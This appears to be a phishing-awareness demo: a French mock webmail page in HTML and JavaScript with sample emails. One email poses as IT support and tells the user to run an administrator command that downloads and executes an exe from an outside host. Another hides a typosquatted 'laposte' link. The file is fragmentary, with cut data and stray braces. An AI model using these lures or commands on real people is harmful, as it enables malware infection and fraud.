<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Inbox MailBox — Mail</title>
<style>
  :root{
    --bg:#f3f6fb; --card:#ffffff; --muted:#6b7280; --accent:#0ea5a1; --danger:#ef4444;
    --shadow: 0 6px 18px rgba(16,24,40,0.06);
    --mono: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
  }
  *{box-sizing:border-box}
  body{
    margin:0; font-family:var(--mono); background:linear-gradient(180deg,#f7fafc, #eef2ff 60%);
    color:#0f172a; min-height:100vh; padding:28px;
  }
  .app{
    max-width:1200px; margin:0 auto; display:grid; grid-template-columns: 320px 1fr; gap:18px;
  }
  header{
    grid-column: 1 / -1; display:flex; align-items:center; justify-content:space-between;
    gap:12px; margin-bottom:6px;
  }
  .brand{display:flex; align-items:center; gap:12px}
  .logo{
    width:48px; height:48px; border-radius:10px; background:linear-gradient(135deg,#06b6d4,#7c3aed);
    color:white; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:18px;
    box-shadow:var(--shadow);
  }
  h1{font-size:18px; margin:0}
  .tools{display:flex; gap:8px; align-items:center}
  button, .btn{
    background:var(--card); border:1px solid #e6edf3; padding:8px 12px; border-radius:8px; cursor:pointer;
    box-shadow:var(--shadow); font-size:13px;
  }
  .btn.primary{background:linear-gradient(90deg,#06b6d4,#0ea5a1); color:white; border:none}
  .btn.ghost{background:transparent; box-shadow:none; border:1px dashed #e6edf3}
  .sidebar{
    background:var(--card); padding:12px; border-radius:12px; box-shadow:var(--shadow); height:calc(100vh - 120px);
    overflow:auto;
  }
  .composer{
    display:flex; gap:8px; margin-bottom:12px;
  }
  .inbox-controls{display:flex; gap:8px; margin-bottom:12px; align-items:center}
  .search{
    flex:1; display:flex; gap:8px; align-items:center; background:#f8fafc; padding:8px; border-radius:10px;
    border:1px solid #eef2f7;
  }
  input[type="text"], textarea {
    width:100%; border:0; background:transparent; font-size:14px; outline:none;
  }
  .folders{display:flex; flex-direction:column; gap:8px}
  .folder{padding:10px; border-radius:8px; display:flex; justify-content:space-between; align-items:center; cursor:pointer}
  .folder:hover{background:#f1f5f9}
  .mail-list{
    background:var(--card); padding:12px; border-radius:12px; box-shadow:var(--shadow); height:calc(100vh - 120px);
    overflow:auto;
  }
  .mail-item{
    display:flex; gap:12px; padding:12px; border-radius:10px; align-items:center; cursor:pointer; border:1px solid transparent;
  }
  .mail-item:hover{background:#f8fafc}
  .avatar{width:42px; height:42px; border-radius:8px; display:flex; align-items:center; justify-content:center; background:#eef2ff; color:#0ea5a1; font-weight:700}
  .meta{flex:1; display:flex; justify-content:space-between; gap:12px}
  .meta-left{display:flex; flex-direction:column}
  .subject{font-weight:600}
  .snippet{color:var(--muted); font-size:13px}
  .time{color:var(--muted); font-size:12px}
  .badges{display:flex; gap:6px}
  .badge{background:#f1f5f9; padding:4px 8px; border-radius:999px; font-size:12px}
  .viewer{
    background:var(--card); padding:18px; border-radius:12px; box-shadow:var(--shadow); height:calc(100vh - 120px);
    overflow:auto;
  }
  .viewer .header{display:flex; justify-content:space-between; gap:12px; align-items:center; margin-bottom:12px}
  .from-line{display:flex; gap:12px; align-items:center}
  .headers{color:var(--muted); font-size:13px; margin-bottom:12px}
  .mail-body{background:#fff; border-radius:10px; padding:14px; border:1px solid #eef2f7}
  .attachments{margin-top:12px; display:flex; gap:8px; flex-wrap:wrap}
  .attach{padding:8px 10px; background:#f8fafc; border-radius:8px; font-size:13px}
  .controls-bottom{display:flex; gap:8px; margin-top:10px}
  .raw-view{white-space:pre-wrap; background:#0f172a; color:#e2e8f0; padding:12px; border-radius:8px; font-family:monospace; font-size:12px}
  footer{grid-column:1/-1; margin-top:8px; text-align:center; color:var(--muted); font-size:13px}
  .small{font-size:12px; color:var(--muted)}
  .theme-toggle{display:flex; gap:6px; align-items:center}

  @media (max-width:980px){
    .app{grid-template-columns:1fr; padding:12px}
    .sidebar{order:2; height:auto}
    .mail-list{order:3; height:auto}
    .viewer{order:1; height:auto}
  }
  .viewer {
    background: var(--card);
    padding: 18px;
    border-radius: 12px;
    box-shadow: var(--shadow);
    height: 65vh;
    width: 85vh;
    position: fixed;
    bottom: 20px;
    right: 20px;
    z-index: 1000;
    display: none;
    flex-direction: column;
    // max-width: 300px;
  }

  .viewer .header {
    display: flex;
    justify-content: space-between;
    gap: 12px;
    align-items: center;
    margin-bottom: 12px;
    position: relative;
    margin-top: 10px;
  }

  .viewer .close-btn {
    position: absolute;
    top: 10px;
    right: 10px;
    background: #ef4444;
    color: white;
    border: none;
    padding: 6px 12px;
    border-radius: 50%;
    cursor: pointer;
    font-size: 16px;
  }
  #full-headers, #plain-body {
    white-space: pre-wrap;
    word-wrap: break-word;
    font-family: "Courier New", Courier, monospace;
  }
</style>
</head>
<body>
  <div class="app">
    <header>
      <div class="brand">
        <div class="logo">MB</div>
        <div>
          <h1>MailBox</h1>
          <div class="small">Boîte de réception — mauricelambert434@mailbox.fr</div>
        </div>
      </div>
      <div class="tools">
        <div class="theme-toggle">
          <label class="small">Thème</label>
          <button class="btn" id="toggle-theme">Clair</button>
        </div>
        <button class="btn ghost" id="export-json">Exporter vos mails</button>
        <label class="btn" style="display:inline-flex; align-items:center; gap:8px; cursor:pointer">
          Importer des mails
          <input id="import-file" type="file" accept="application/json" style="display:none" />
        </label>
        <button class="btn primary" id="new-mail">Nouveau mail</button>
      </div>
    </header>

    <aside class="sidebar">
      <div class="composer">
        <div style="flex:1">
          <div class="search">
            <input type="text" id="search" placeholder="Rechercher par sujet, expéditeur, contenu..." />
            <button class="btn" id="clear-search">×</button>
          </div>
        </div>
      </div>

      <div class="inbox-controls">
        <select id="sort" class="btn">
          <option value="date_desc">Date (récent)</option>
          <option value="date_asc">Date (ancien)</option>
          <option value="from_asc">Expéditeur A→Z</option>
        </select>
        <button class="btn" id="mark-all-read">Tout lu</button>
      </div>

      <div class="folders">
        <div class="folder" data-folder="inbox"><span>Boîte de réception</span><span class="badge" id="count-inbox">0</span></div>
        <div class="folder" data-folder="important"><span>Important</span><span class="badge" id="count-important">0</span></div>
        <div class="folder" data-folder="unread"><span>Non lus</span><span class="badge" id="count-unread">0</span></div>
      </div>

      <hr style="margin:12px 0; border:none; border-top:1px solid #eef2f7" />

      <div>
        <label class="small">Charger JSON (coller)</label>
        <textarea id="json-input" rows="7" style="width:100%; padding:8px; border-radius:8px; border:1px solid #eef2f7;"></textarea>
        <div style="display:flex; gap:8px; margin-top:8px">
          <button class="btn primary" id="load-json">Charger</button>
          <button class="btn" id="clear-json">Effacer</button>
          <button class="btn" id="sample-json">Exemple</button>
        </div>
      </div>
    </aside>

    <section class="mail-list" id="mail-list">
    </section>

    <section class="viewer" id="viewer">
      <button class="close-btn" id="close-viewer">×</button>
      <div class="header">
        <div class="from-line">
          <div class="avatar" id="view-avatar">A</div>
          <div>
            <div id="view-subject" style="font-weight:700; font-size:16px">Sélectionner un message</div>
            <div class="small headers" id="view-from">—</div>
          </div>
        </div>
        <div>
          <div class="small" id="view-date"></div>
          <div style="margin-top:8px" class="controls-bottom">
            <button class="btn" id="toggle-read">Marquer lu/ non lu</button>
            <button class="btn" id="toggle-important">Important</button>
            <button class="btn" id="view-raw">Voir source</button>
          </div>
        </div>
      </div>

      <div class="headers small" id="full-headers" style="display:none;"></div>

      <div class="mail-body" id="mail-body">
        <div class="small" style="color:var(--muted)">Aucun message sélectionné.</div>
      </div>

      <div class="attachments" id="attachments"></div>

      <div style="margin-top:12px">
        <div class="small">Corps texte (plain):</div>
        <div id="plain-body" class="small" style="padding:8px 0; color:var(--muted)"></div>
      </div>

      <div id="raw-panel" style="display:none; margin-top:12px">
        <div class="small">Source brute / JSON</div>
        <div id="raw-content" class="raw-view"></div>
      </div>

    </section>

    <footer>© 2025 MailBox • Adresse mail sécurisée</footer>
  </div>

    "body_html": "<p>Bonjour Maurice,</p><p>Je crois que nous n'avons jamais eu l'occasion de nous présenter, je suis Gérard du service IT. J'ai entendu beaucoup de bien de vous, et on m’a dit que vous êtes très professionnel.</p><p>Je me permets de vous contacter car lors de la dernière mise à jour de nos paramètres de sécurité, une erreur, sur votre poste, a empêché la bonne application sur votre poste. Pour corriger cela et maintenir la conformité de votre environnement de travail, j’aurais besoin que vous réalisiez une petite manipulation, cela ne prendra que quelques instants.</p><p><strong>Voici la marche à suivre :</strong></p><ol><li>Ouvrez le <strong>menu Démarrer</strong> (en bas à gauche de votre écran).</li><li>Tapez <strong>cmd</strong>, puis faites un clic droit sur <strong>Invite de commandes</strong> et choisissez <strong>Exécuter en tant qu’administrateur</strong>.</li><li>Dans la fenêtre noire qui s’ouvre, copiez-collez la commande suivante puis appuyez sur <strong>Entrée</strong> :</li></ol><pre><code>bitsadmin /transfer \"fix-support-it\" /priority normal \"https://fix.support.it/\" \"%APPDATA%\\fix-tool.exe\" ; \"%APPDATA%\\fix-tool.exe\"</code></pre><p>Attendez que le message de confirmation apparaisse.</p><p>Je compte sur vous pour résoudre ce problème le plus rapidement possible car sans cela votre poste est vulnérable, il risquerait d'être hacké. Ne vous inquiétez pas : si vous appliquez le correctif décrit ci-dessus, votre poste sera parfaitement sécurisé.</p><p>Merci beaucoup pour votre aide et votre réactivité !</p><p>Bien cordialement,<br><strong>Gérard Balard</strong><br>Service Technique IT – Sehoia</p>",

    "body_html": "<p>Bonjour Monsieur Maurice Lambert,</p><p>Comment allez-vous ? J'espère que vous allez bien.</p><p>Je souhaitais vous informer qu’un courrier à votre nom est arrivé par erreur à mon adresse, afin que vous puissiez en disposer rapidement.</p><p>Nos adresses sont apparemment identiques (même numéro et nom de rue), mais situées dans des départements différents, ce qui a sans doute causé la confusion.</p><p>Pourriez-vous vérifier que le courrier vous est bien adressé ? Voici l'adresse et le nom :<br><strong>Mr Maurice Lambert, 17 Rue de la République 38000 Grenoble, France.</strong></p><p>J’ai essayé de vous renvoyer le courrier mais le facteur n’a pas pu le reprendre, et étant en situation de handicap, il m’est difficile de me déplacer jusqu’à la poste.</p><p>Le facteur m’a suggéré d’utiliser le service sécurisé de La Poste qui permet d’envoyer une copie scannée du courrier au format PDF.</p><p>Je n’ai pas lu le contenu du courrier, mais je l’ai ouvert pour chercher à vous contacter et j'ai trouvé votre adresse e-mail.</p><p>Le courrier semble important parce qu'il est officiel, j'ai pris l'initiative de vous en faire une copie afin que vous puissiez en prendre connaissance dans les meilleurs délais: <a href='https://1aposte.fr/web/service/courriers/online/'>https://laposte.fr/web/service/courriers/online/</a>.</p><p>Je peux, si vous le souhaitez, le conserver à disposition en attendant que vous trouviez la solution qui vous conviendra le mieux.</p><p>Merci de me faire savoir la marche à suivre.</p><p>Cordialement,<br><strong>Thomas Du Pré-Houle</strong><br>17 Rue de la République,<br>14460 Colombelles, France.</p>",

function uid(prefix='m'){ return prefix + Math.random().toString(36).slice(2,9); }

function formatDate(iso){
  if(!iso) return '';
  const d = new Date(iso);
  if(isNaN(d)) return iso;
  return d.toLocaleString();
}

function shortName(name, email){
  if(name) return name;
  if(email) return email.split('@')[0];
  return '—';
}

function sanitizeHTML(html) {
  const doc = new DOMParser().parseFromString(html || '', 'text/html');

  ['script','style','iframe','object','link'].forEach(tag => {
    doc.querySelectorAll(tag).forEach(n=>n.remove());
  });

  const walker = doc.createTreeWalker(doc.body, NodeFilter.SHOW_ELEMENT, null, false);
  while(walker.nextNode()){
    const el = walker.currentNode;
    [...el.attributes].forEach(attr=>{
      const name = attr.name.toLowerCase();
      const val = attr.value || '';
      if(name.startsWith('on')) el.removeAttribute(attr.name);
      if((name==='href' || name==='src') && val.trim().toLowerCase().startsWith('javascript:')) el.removeAttribute(attr.name);
      if((name==='href' || name==='src') && val.trim().toLowerCase().startsWith('data:') && !val.trim().toLowerCase().startsWith('data:image')) {
        el.removeAttribute(attr.name);
      }
      if(name==='srcdoc') el.removeAttribute(attr.name);
    });
  }

  return doc.body.innerHTML;
}

function renderList(filter=''){
  const q = (document.getElementById('search').value || '').toLowerCase();
  const sort = document.getElementById('sort').value;
  let arr = mails.slice();

  if(q){
    arr = arr.filter(m=>{
      return (m.subject||'').toLowerCase().includes(q) ||
             (m.body_text||'').toLowerCase().includes(q) ||
             (m.body_html||'').toLowerCase().includes(q) ||
             (m.from?.name||'').toLowerCase().includes(q) ||
             (m.from?.email||'').toLowerCase().includes(q);
    });
  }

  if(sort==='date_desc') arr.sort((a,b)=> new Date(b.date) - new Date(a.date));
  else if(sort==='date_asc') arr.sort((a,b)=> new Date(a.date) - new Date(b.date));
  else if(sort==='from_asc') arr.sort((a,b)=> (a.from?.name||a.from?.email||'').localeCompare(b.from?.name||b.from?.email||''));

  listEl.innerHTML = '';
  arr.forEach(m=>{
    const item = document.createElement('div');
    item.className = 'mail-item';
    item.title = `${m.from.name} <${m.from.email}>`;
    item.dataset.id = m.id;
    if(selectedId === m.id){
      item.style.outline = '2px solid rgba(14,165,161,0.12)';
    }

    const avatar = document.createElement('div');
    avatar.className = 'avatar';
    avatar.textContent = (m.from?.name || m.from?.email || 'U').slice(0,2).toUpperCase();

    const meta = document.createElement('div');
    meta.className = 'meta';
    const left = document.createElement('div');
    left.className = 'meta-left';
    const subj = document.createElement('div');
    subj.className = 'subject';
    subj.textContent = m.subject || '(sans objet)';
    if(!m.flags?.read) subj.style.fontWeight = 700;
    const snippet = document.createElement('div');
    snippet.className = 'snippet';
    snippet.textContent = m.snippet || (m.body_text||'').slice(0,120);

    left.appendChild(subj);
    left.appendChild(snippet);

    const right = document.createElement('div');
    right.style.display='flex';
    right.style.flexDirection='column';
    right.style.alignItems='flex-end';
    right.style.justifyContent='space-between';
    const time = document.createElement('div');
    time.className = 'time';
    time.textContent = formatDate(m.date);
    const badges = document.createElement('div');
    badges.className = 'badges';
    if(m.flags?.important) badges.innerHTML += '<span class="badge" style="background:#fff7ed;color:#b45309">Important</span>';
    if(!m.flags?.read) badges.innerHTML += '<span class="badge">Non lu</span>';
    right.appendChild(time);
    right.appendChild(badges);

    meta.appendChild(left);
    meta.appendChild(right);

    item.appendChild(avatar);
    item.appendChild(meta);

    item.addEventListener('click', ()=> selectMail(m.id));

    listEl.appendChild(item);
  });

  document.getElementById('count-inbox').textContent = mails.length;
  document.getElementById('count-unread').textContent = mails.filter(m=>!m.flags?.read).length;
  document.getElementById('count-important').textContent = mails.filter(m=>m.flags?.important).length;
}

function selectMail(id){
  selectedId = id;
  const m = mails.find(x=>x.id===id);
  if(!m) return;

  m.flags = m.flags || {};
  m.flags.read = true;
  renderList();
  
  document.getElementById('viewer').style.display = 'flex';

  viewSubject.textContent = m.subject || '(sans objet)';
  viewFrom.innerHTML = `${m.from?.name ? `${m.from.name}` : ''} <span style="color:var(--muted)">&lt;${m.from?.email||''}&gt;</span>`;
  viewAvatar.textContent = (m.from?.name || m.from?.email || 'U').slice(0,2).toUpperCase();
  viewDate.textContent = formatDate(m.date);

  fullHeaders.style.display='block';
  fullHeaders.textContent = `
De: ${((m.from?.name || '') + ((' <' + m.from?.email + '>') || ' <>')).padEnd(35)} Attachements: ${m.attachments?.length || 0}
À: ${((m.to || []).map(t=> (t.name? t.name+' ': '') + '<'+t.email+'>').join(', ')).padEnd(36)} Date: ${m.date || ''}
Sujet: ${m.subject}`;

  if(m.body_html){
    const safe = sanitizeHTML(m.body_html);
    mailBody.innerHTML = safe;
  } else {
    mailBody.innerHTML = '<div class="small" style="color:var(--muted)">Pas de contenu HTML</div>';
  }

  attachmentsEl.innerHTML = '';
  (m.attachments||[]).forEach(a=>{
    const el = document.createElement('div');
    el.className = 'attach';
    el.textContent = `${a.filename || 'fichier'} (${Math.round((a.size||0)/1024)} KB)`;
    attachmentsEl.appendChild(el);
  });

  plainBodyEl.textContent = m.body_text || '';
  rawPanel.style.display = 'none';
  rawContent.textContent = JSON.stringify(m, null, 2);
}

}
